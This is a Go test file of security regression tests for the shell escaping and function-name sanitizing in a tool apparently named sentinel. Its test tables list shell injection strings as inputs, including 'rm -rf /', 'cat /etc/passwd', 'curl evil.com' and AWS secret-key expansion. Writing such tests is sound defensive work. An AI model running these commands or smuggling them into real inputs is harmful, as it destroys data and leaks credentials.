package shell

import (
	"regexp"
	"strings"
	"testing"
)

// ============================================================================
// Security Regression Tests for Shell Function Generation (Phase 134)
// ============================================================================
//
// THREAT MODEL:
// Profile names come from SSM parameters which are admin-controlled.
// However, we sanitize defensively for defense-in-depth against:
// 1. Compromised SSM parameter names
// 2. Future sources of profile names (config files, user input)
// 3. Accidental injection via copy-paste errors
//
// SECURITY PROPERTIES:
// 1. shellEscape(): Output can be safely evaluated by shell without executing injected commands
// 2. sanitizeFunctionName(): Output contains only alphanumeric chars, hyphens, and "sentinel-" prefix
//
// Tests use TestSecurityRegression_ prefix for CI/CD filtering.
// ============================================================================

// TestSecurityRegression_ShellEscape verifies shellEscape() prevents injection attacks.
// The key security property is that escaped strings, when evaluated by a shell,
// do NOT execute injected commands or expand variables.
func TestSecurityRegression_ShellEscape(t *testing.T) {
	injectionVectors := []struct {
		name        string
		input       string
		description string
	}{
		// Command substitution attacks
		{
			name:        "command_substitution_dollar_parens",
			input:       "$(whoami)",
			description: "command substitution via $()",
		},
		{
			name:        "command_substitution_backticks",
			input:       "`whoami`",
			description: "command substitution via backticks",
		},
		{
			name:        "nested_command_substitution",
			input:       "$(echo $(id))",
			description: "nested command substitution",
		},
		{
			name:        "arithmetic_expansion",
			input:       "$((1+1))",
			description: "arithmetic expansion",
		},

		// Variable expansion attacks
		{
			name:        "variable_expansion_simple",
			input:       "$HOME",
			description: "simple variable expansion",
		},
		{
			name:        "variable_expansion_braces",
			input:       "${PATH}",
			description: "variable expansion with braces",
		},
		{
			name:        "variable_expansion_default",
			input:       "${UNDEFINED:-malicious}",
			description: "variable expansion with default value",
		},
		{
			name:        "environment_exfiltration",
			input:       "${AWS_SECRET_ACCESS_KEY}",
			description: "AWS credential exfiltration via variable expansion",
		},

		// Command chaining attacks
		{
			name:        "semicolon_injection",
			input:       "; rm -rf /",
			description: "command chaining via semicolon",
		},
		{
			name:        "pipe_injection",
			input:       "| cat /etc/passwd",
			description: "pipe injection to steal data",
		},
		{
			name:        "background_execution",
			input:       "& curl evil.com",
			description: "background command execution",
		},
		{
			name:        "and_chain",
			input:       "&& malicious",
			description: "command chaining via &&",
		},
		{
			name:        "or_chain",
			input:       "|| malicious",
			description: "command chaining via ||",
		},

		// Newline injection attacks
		{
			name:        "newline_injection",
			input:       "normal\nmalicious",
			description: "newline to inject separate command",
		},
		{
			name:        "carriage_return_injection",
			input:       "normal\rmalicious",
			description: "carriage return injection",
		},
		{
			name:        "crlf_injection",
			input:       "normal\r\nmalicious",
			description: "CRLF injection",
		},

		// Quote escaping attacks
		{
			name:        "single_quote_escape",
			input:       "test'$(whoami)",
			description: "single quote to break out and inject",
		},
		{
			name:        "double_quote_escape",
			input:       "test\"$(whoami)",
			description: "double quote escape attempt",
		},
		{
			name:        "backslash_quote_escape",
			input:       "test\\'$(whoami)",
			description: "backslash to escape quote",
		},
		{
			name:        "multiple_quotes",
			input:       "a'b\"c`d",
			description: "multiple quote types",
		},

		// Backslash sequences
		{
			name:        "backslash_newline",
			input:       "test\\\nmalicious",
			description: "backslash newline continuation",
		},
		{
			name:        "backslash_escape",
			input:       "test\\$(whoami)",
			description: "backslash escape attempt",
		},

		// Special shell characters
		{
			name:        "exclamation_history",
			input:       "test!command",
			description: "bash history expansion",
		},
		{
			name:        "glob_asterisk",
			input:       "/*",
			description: "glob expansion",
		},
		{
			name:        "glob_question",
			input:       "/etc/passw?",
			description: "single char glob",
		},
		{
			name:        "glob_brackets",
			input:       "/etc/[a-z]*",
			description: "bracket glob expansion",
		},
		{
			name:        "brace_expansion",
			input:       "{a,b,c}",
			description: "brace expansion",
		},
		{
			name:        "tilde_expansion",
			input:       "~root",
			description: "tilde home directory expansion",
		},
		{
			name:        "process_substitution",
			input:       "<(cat /etc/passwd)",
			description: "process substitution",
		},
		{
			name:        "here_string",
			input:       "<<< malicious",
			description: "here-string injection",
		},
	}

	for _, tc := range injectionVectors {
		t.Run(tc.name, func(t *testing.T) {
			escaped := shellEscape(tc.input)

			// Key verification: if the escaped string contains the input literally quoted,
			// it won't be executed. Single-quoted strings in shell preserve everything except
			// single quotes themselves (which our escape handles).

			// Verify the escaped output is different from dangerous input (or safely quoted)
			// For simple alphanumeric strings this may be the same, but for injection vectors
			// they MUST be quoted.
			if escaped == tc.input && strings.ContainsAny(tc.input, " \t\n'\"\\$`!") {
				t.Errorf("SECURITY VIOLATION: Dangerous input %q was not escaped (%s)", tc.input, tc.description)
			}

			// Verify the escape uses single quotes (our escape strategy)
			if strings.ContainsAny(tc.input, " \t\n'\"\\$`!") {
				if !strings.HasPrefix(escaped, "'") || !strings.HasSuffix(escaped, "'") {
					t.Errorf("SECURITY VIOLATION: Escaped output %q is not single-quoted (%s)", escaped, tc.description)
				}
			}

			// Verify that single quotes within input are properly escaped
			// The pattern 'foo'\''bar' is used to include a literal single quote
			if strings.Contains(tc.input, "'") {
				if !strings.Contains(escaped, "'\\''") {
					t.Errorf("SECURITY VIOLATION: Single quote in input not properly escaped in %q (%s)", escaped, tc.description)
				}
			}
		})
	}
}

// TestSecurityRegression_FunctionNameSanitization verifies sanitizeFunctionName() prevents injection.
// The key security property is that function names contain ONLY alphanumeric characters, hyphens,
// and the "sentinel-" prefix, making them safe for use in shell function definitions.
func TestSecurityRegression_FunctionNameSanitization(t *testing.T) {
	maliciousNames := []struct {
		name        string
		input       string
		description string
	}{
		// Shell metacharacters
		{
			name:        "semicolon",
			input:       "profile;rm -rf /",
			description: "semicolon command injection",
		},
		{
			name:        "pipe",
			input:       "profile|malicious",
			description: "pipe injection",
		},
		{
			name:        "ampersand",
			input:       "profile&malicious",
			description: "background execution",
		},
		{
			name:        "dollar_sign",
			input:       "profile$HOME",
			description: "variable expansion in function name",
		},
		{
			name:        "parentheses",
			input:       "profile(){}",
			description: "function definition injection",
		},
		{
			name:        "curly_braces",
			input:       "profile{}",
			description: "brace expansion in name",
		},
		{
			name:        "backticks",
			input:       "profile`whoami`",
			description: "command substitution in name",
		},

		// Path separators
		{
			name:        "forward_slash",
			input:       "profile/../../etc/passwd",
			description: "path traversal via forward slash",
		},
		{
			name:        "path_traversal",
			input:       "../..",
			description: "parent directory traversal",
		},

		// Whitespace
		{
			name:        "space",
			input:       "profile with space",
			description: "space in function name",
		},
		{
			name:        "tab",
			input:       "profile\twith\ttab",
			description: "tab in function name",
		},
		{
			name:        "newline",
			input:       "profile\nmalicious",
			description: "newline in function name",
		},

		// Null bytes
		{
			name:        "null_byte",
			input:       "profile\x00malicious",
			description: "null byte injection",
		},

		// Unicode
		{
			name:        "unicode_homoglyph",
			input:       "profile\u0430dmin",
			description: "Cyrillic 'a' homoglyph",
		},
		{
			name:        "unicode_control",
			input:       "profile\u200Bhidden",
			description: "zero-width space",
		},
		{
			name:        "unicode_rtl",
			input:       "profile\u202Ereversed",
			description: "right-to-left override",
		},

		// Quote characters
		{
			name:        "single_quote",
			input:       "profile'injection",
			description: "single quote in name",
		},
		{
			name:        "double_quote",
			input:       "profile\"injection",
			description: "double quote in name",
		},

		// Other dangerous characters
		{
			name:        "at_sign",
			input:       "profile@attack",
			description: "at sign",
		},
		{
			name:        "hash",
			input:       "profile#comment",
			description: "hash comment character",
		},
		{
			name:        "equals",
			input:       "profile=value",
			description: "equals sign",
		},
	}

	// Regex to validate sanitized function names: must be sentinel- followed by alphanumeric and hyphens
	validFuncName := regexp.MustCompile(`^sentinel-[a-zA-Z0-9-]*$`)

	for _, tc := range maliciousNames {
		t.Run(tc.name, func(t *testing.T) {
			sanitized := sanitizeFunctionName(tc.input)

			// Key verification: sanitized name must match our safe pattern
			if !validFuncName.MatchString(sanitized) {
				t.Errorf("SECURITY VIOLATION: Sanitized name %q does not match safe pattern (%s)", sanitized, tc.description)
			}

			// Verify no shell metacharacters survive
			shellMetachars := ";|&$(){}[]`'\"\\<>!*?~\n\r\t\x00"
			for _, c := range shellMetachars {
				if strings.ContainsRune(sanitized, c) {
					t.Errorf("SECURITY VIOLATION: Shell metacharacter %q survived sanitization in %q (%s)", c, sanitized, tc.description)
				}
			}

			// Verify sentinel- prefix is present
			if !strings.HasPrefix(sanitized, "sentinel-") {
				t.Errorf("SECURITY VIOLATION: Missing sentinel- prefix in %q (%s)", sanitized, tc.description)
			}

			// Verify no Unicode characters survive (only ASCII alphanumeric and hyphen)
			for _, c := range sanitized {
				if c > 127 {
					t.Errorf("SECURITY VIOLATION: Non-ASCII character %q (U+%04X) survived sanitization (%s)", c, c, tc.description)
				}
			}
		})
	}
}

// TestSecurityRegression_GeneratedScriptSafety tests the entire script generation pipeline.
// This is an integration test verifying that the script generation process is safe.
//
// THREAT MODEL CONTEXT:
// Profile names come from SSM parameter paths which are admin-controlled and validated
// by AWS SSM. SSM parameter names cannot contain shell metacharacters like $, `, ;, |, &
// as they must match the pattern: ^[a-zA-Z0-9_.-/]+$
//
// However, policy paths (the full SSM parameter path) could theoretically contain
// characters like $, but SSM would reject such paths. We test defense-in-depth.
func TestSecurityRegression_GeneratedScriptSafety(t *testing.T) {
	// Test with profiles that have names containing characters that would need escaping.
	// Note: In practice, SSM validates parameter names, but we test defense-in-depth.
	testProfiles := []ProfileInfo{
		// Normal profile - should work without quoting
		{Name: "production", PolicyPath: "/sentinel/policies/production"},
		// Profile with space - requires quoting
		{Name: "my profile", PolicyPath: "/sentinel/policies/my profile"},
		// Profile with special shell chars that SSM would reject but we handle defensively
		{Name: "test$var", PolicyPath: "/sentinel/policies/test"},
		{Name: "test`cmd`", PolicyPath: "/sentinel/policies/test"},
		// Single quote in name - tests our escape mechanism
		{Name: "team's-profile", PolicyPath: "/sentinel/policies/teams-profile"},
	}

	script := GenerateScript(testProfiles, "/sentinel/policies", FormatBash)

	// Verify all function definitions are safe (this is the critical path)
	t.Run("safe_function_definitions", func(t *testing.T) {
		// Function definitions should match: sentinel-<safe-name>()
		funcDefPattern := regexp.MustCompile(`^([a-zA-Z0-9-]+)\(\)`)
		lines := strings.Split(script, "\n")
		for _, line := range lines {
			if strings.HasSuffix(line, "() {") || strings.HasSuffix(line, "()") {
				// Extract function name
				match := funcDefPattern.FindStringSubmatch(line)
				if match != nil {
					funcName := match[1]
					if !strings.HasPrefix(funcName, "sentinel-") {
						t.Errorf("SECURITY VIOLATION: Function name %q missing sentinel- prefix", funcName)
					}
					// Verify only safe characters
					for _, c := range funcName {
						if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '-') {
							t.Errorf("SECURITY VIOLATION: Function name %q contains unsafe character %q", funcName, c)
						}
					}
				}
			}
		}
	})

	// Verify that inputs containing $, `, ', etc. are properly quoted in exec commands
	t.Run("dangerous_chars_quoted", func(t *testing.T) {
		// Profile with $ should have the profile name quoted
		if !strings.Contains(script, "'test$var'") {
			t.Errorf("SECURITY VIOLATION: Profile name with $ not properly quoted in script")
		}
		// Profile with backtick should have the profile name quoted
		if !strings.Contains(script, "'test`cmd`'") {
			t.Errorf("SECURITY VIOLATION: Profile name with backtick not properly quoted in script")
		}
		// Profile with space should have it quoted
		if !strings.Contains(script, "'my profile'") {
			t.Errorf("SECURITY VIOLATION: Profile name with space not properly quoted in script")
		}
		// Single quote should use escape sequence
		if !strings.Contains(script, "'\\''") {
			t.Errorf("SECURITY VIOLATION: Single quote in profile name not properly escaped")
		}
	})

	// Verify header comment is safe (it's a comment, not executed)
	t.Run("header_is_comment", func(t *testing.T) {
		lines := strings.Split(script, "\n")
		for _, line := range lines {
			if strings.Contains(line, "$(sentinel shell init)") {
				if !strings.HasPrefix(strings.TrimSpace(line), "#") {
					t.Errorf("SECURITY VIOLATION: Shell init instruction not in comment: %s", line)
				}
			}
		}
	})

	// Verify function body structure is consistent
	t.Run("function_body_structure", func(t *testing.T) {
		// All function bodies should follow pattern: sentinel exec --profile X --policy-parameter Y -- "$@"
		execPattern := regexp.MustCompile(`sentinel exec --(?:server --)?profile .+ --policy-parameter .+ -- "\$@"`)
		lines := strings.Split(script, "\n")
		for _, line := range lines {
			trimmed := strings.TrimSpace(line)
			if strings.HasPrefix(trimmed, "sentinel exec") {
				if !execPattern.MatchString(trimmed) {
					t.Errorf("SECURITY VIOLATION: Function body has unexpected structure: %s", trimmed)
				}
			}
		}
	})
}

// TestSecurityRegression_GeneratedScriptInjectionVectors specifically tests
// against known shell injection patterns to verify they are properly escaped.
func TestSecurityRegression_GeneratedScriptInjectionVectors(t *testing.T) {
	// These are profiles with names that could be injection vectors if not escaped
	injectionProfiles := []ProfileInfo{
		// Command substitution
		{Name: "$(whoami)", PolicyPath: "/sentinel/policies/normal"},
		// Variable expansion
		{Name: "$HOME", PolicyPath: "/sentinel/policies/normal"},
		// Backtick command substitution
		{Name: "`id`", PolicyPath: "/sentinel/policies/normal"},
	}

	script := GenerateScript(injectionProfiles, "/sentinel/policies", FormatBash)

	// Verify each injection vector is quoted in the generated script
	t.Run("command_substitution_quoted", func(t *testing.T) {
		// The profile name should be single-quoted
		if !strings.Contains(script, "'$(whoami)'") {
			t.Errorf("SECURITY VIOLATION: Command substitution not quoted in generated script")
		}
	})

	t.Run("variable_expansion_quoted", func(t *testing.T) {
		if !strings.Contains(script, "'$HOME'") {
			t.Errorf("SECURITY VIOLATION: Variable expansion not quoted in generated script")
		}
	})

	t.Run("backtick_quoted", func(t *testing.T) {
		if !strings.Contains(script, "'`id`'") {
			t.Errorf("SECURITY VIOLATION: Backtick command substitution not quoted in generated script")
		}
	})

	// Verify function names are all safe (sanitized)
	t.Run("function_names_safe", func(t *testing.T) {
		// Even with injection attempts, function names should be safe
		// $(whoami) -> sentinel-whoami ($ removed)
		// $HOME -> sentinel-HOME ($ removed)
		// `id` -> sentinel-id (backticks removed)
		funcNamePattern := regexp.MustCompile(`^sentinel-[a-zA-Z0-9-]+\(\)`)
		lines := strings.Split(script, "\n")
		for _, line := range lines {
			if strings.Contains(line, "() {") {
				if !funcNamePattern.MatchString(strings.TrimSpace(line)) {
					t.Errorf("SECURITY VIOLATION: Unsafe function definition: %s", line)
				}
			}
		}
	})
}

// TestSecurityRegression_ShellEscapeEmpty verifies edge case handling.
func TestSecurityRegression_ShellEscapeEmpty(t *testing.T) {
	t.Run("empty_string", func(t *testing.T) {
		escaped := shellEscape("")
		if escaped != "" {
			t.Errorf("shellEscape(\"\") = %q, want \"\"", escaped)
		}
	})

	t.Run("only_special_chars", func(t *testing.T) {
		escaped := shellEscape("$`'\"")
		// Should be quoted
		if !strings.HasPrefix(escaped, "'") {
			t.Errorf("SECURITY VIOLATION: Special-only string not quoted: %q", escaped)
		}
	})
}

// TestSecurityRegression_SanitizeFunctionNameEmpty verifies edge case handling.
func TestSecurityRegression_SanitizeFunctionNameEmpty(t *testing.T) {
	t.Run("empty_string", func(t *testing.T) {
		sanitized := sanitizeFunctionName("")
		// Should still have sentinel- prefix
		if sanitized != "sentinel-" {
			t.Errorf("sanitizeFunctionName(\"\") = %q, want \"sentinel-\"", sanitized)
		}
	})

	t.Run("only_special_chars", func(t *testing.T) {
		sanitized := sanitizeFunctionName("@#$%^&*()")
		// Should be sentinel- with empty suffix after trimming
		if sanitized != "sentinel-" {
			t.Errorf("sanitizeFunctionName(\"@#$%%^&*()\") = %q, want \"sentinel-\"", sanitized)
		}
	})
}
